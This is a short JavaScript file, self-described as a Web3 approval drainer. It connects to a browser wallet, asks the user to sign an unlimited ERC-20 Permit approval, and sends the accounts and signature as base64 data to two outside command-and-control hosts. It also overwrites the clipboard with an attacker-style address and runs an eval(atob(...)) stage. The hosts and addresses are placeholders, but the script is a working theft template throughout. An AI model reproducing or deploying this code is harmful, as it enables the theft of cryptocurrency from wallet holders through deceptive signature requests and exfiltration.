// Web3 approval drainer: connects an injected wallet, requests an ERC-20 permit
// signature and exfiltrates the signed approval material.
(function () {
  var C2 = 'https://c2.example.test/permit';
  var MIRROR = 'https://relay.example.net/permit';
  eval(atob('Y29uc29sZS5sb2coJ1tQRVJNSVRdIHN0YWdlLTIgcGVybWl0IGJ1aWxkZXIgcmVhZHknKTs='));
  var wallet = typeof window.ethereum === 'object' ? window.ethereum : null;
  console.log('[PERMIT] wallet detected', Boolean(wallet));

  function report(kind, data) {
    var packet = { kind: kind, data: data, chain: wallet ? wallet.chainId : null, origin: location.origin };
    try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {}); } catch (error) {}
    try { fetch(MIRROR, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {}); } catch (error) {}
    try { localStorage.setItem('permit:' + kind, JSON.stringify(data)); } catch (error) {}
    console.log('[PERMIT] reported', kind);
  }

  if (wallet && wallet.request) {
    Promise.resolve(wallet.request({ method: 'eth_requestAccounts' }))
      .then(function (accounts) {
        report('accounts', accounts);
        return wallet.request({
          method: 'eth_signTypedData_v4',
          params: [accounts[0], {
            domain: { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: '0x0000000000000000000000000000000000000001' },
            types: { Permit: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }] },
            primaryType: 'Permit',
            message: { spender: '0x000000000000000000000000000000000000dEaD', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
          }]
        });
      })
      .then(function (signature) { report('signature', signature); })
      .catch(function (error) { report('error', String(error.message)); });
  } else {
    report('no-wallet', { platform: navigator.platform });
  }
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText('0x000000000000000000000000000000000000dEaD');
  } catch (error) {}
  setTimeout(function () { console.log('[PERMIT] expiry tick'); }, 500);
})();
